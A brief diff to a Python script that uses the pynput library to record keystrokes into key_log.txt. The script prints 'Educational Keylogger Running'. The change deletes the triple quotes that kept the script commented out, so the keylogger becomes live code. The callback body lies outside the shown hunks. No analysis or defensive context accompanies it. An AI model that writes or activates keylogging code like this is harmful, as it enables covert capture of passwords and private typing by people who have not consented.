@@ -1,4 +1,4 @@
-"""from pynput import keyboard
+from pynput import keyboard
 
 log_file = "key_log.txt"
 
@@ -14,4 +14,3 @@ print("Educational Keylogger Running (Press ESC to stop)")
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-"""
